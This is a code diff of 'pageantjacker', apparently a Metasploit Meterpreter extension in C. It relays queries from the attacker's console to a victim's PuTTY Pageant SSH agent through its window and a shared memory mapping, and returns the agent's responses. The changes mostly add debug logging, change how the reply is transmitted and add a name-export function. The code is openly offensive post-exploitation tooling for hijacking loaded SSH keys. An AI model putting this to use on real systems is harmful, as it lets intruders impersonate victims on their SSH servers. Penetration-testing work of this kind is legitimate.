@@ -25,24 +25,32 @@ DWORD request_pageant_send_query(Remote *remote, Packet *packet)
 	Packet *response = packet_create_response(packet);
 	DWORD raw_data_size_in;
 	Byte *raw_data_in;
-	PAGEANTQUERYRESULTS results;
+	PAGEANTQUERYRESULTS results = { 0 };
 
 	/* dprintf */
-
 	// Retrieve from metasploit
 	raw_data_size_in = packet_get_tlv_value_uint(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_SIZE_IN);
 	raw_data_in = packet_get_tlv_value_raw(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_BLOB_IN);
+	
+	dprintf("%d - %p", raw_data_size_in, raw_data_in);
 
 	// Interact with Pageant. Note that this will always return a struct, even if the operation failed.
 	results = send_query_to_pageant(raw_data_in, AGENT_MAX);
 
 	// Build the packet based on the respones from the Pageant interaction.
+	dprintf("Result: %p - %d", &results.result, results.result);
 	packet_add_tlv_bool(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_STATUS, results.result);
+	dprintf("Blob: %p - %d", results.blob, (DWORD)results.blob[0]);
 	packet_add_tlv_raw(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_RETURNEDBLOB, results.blob, AGENT_MAX);
+	dprintf("Error Message: %p - %s", &results.error_message, results.error_message);
 	packet_add_tlv_string(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE, results.error_message);	
 
 	// Transmit the packet to metasploit
-	packet_transmit_response(ERROR_SUCCESS, remote, response);
+	dprintf("Preparing to transmit response");
+	//packet_transmit_empty_response(remote, response, ERROR_SUCCESS);
+	//packet_transmit_response(ERROR_SUCCESS, remote, response);
+	PACKET_TRANSMIT(remote, response, NULL);
+	dprintf("Transmitted response");
 
 	// Free the allocated memory once we are done
 	if (results.blob)
@@ -74,6 +82,18 @@ DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
 	return ERROR_SUCCESS;
 }
 
+/*!
+* @brief Get the name of the extension.
+* @param buffer Pointer to the buffer to write the name to.
+* @param bufferSize Size of the \c buffer parameter.
+* @return Indication of success or failure.
+*/
+DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
+{
+	strncpy_s(buffer, bufferSize, "pageantjacker", bufferSize - 1);
+	return ERROR_SUCCESS;
+}
+
 PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength) {
 
 	char strPuttyRequest[23]; // This will always be 23 chars
@@ -88,7 +108,7 @@ PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength)
 	memset(&strPuttyRequest, 0, sizeof(strPuttyRequest));
 	ret.result = FALSE;
 	ret.error_message = PAGEANTJACKER_ERROR_NOERROR;
-	
+
 	if (hPageant = FindWindowW(PAGEANT_NAME, PAGEANT_NAME)) {
 
 		// Generate the request string and populate the struct
@@ -123,6 +143,7 @@ PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength)
 				} else {
 					// MapViewOfFile failed
 					ret.error_message = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
+
 				}
 				CloseHandle(filemap);
 			} else {
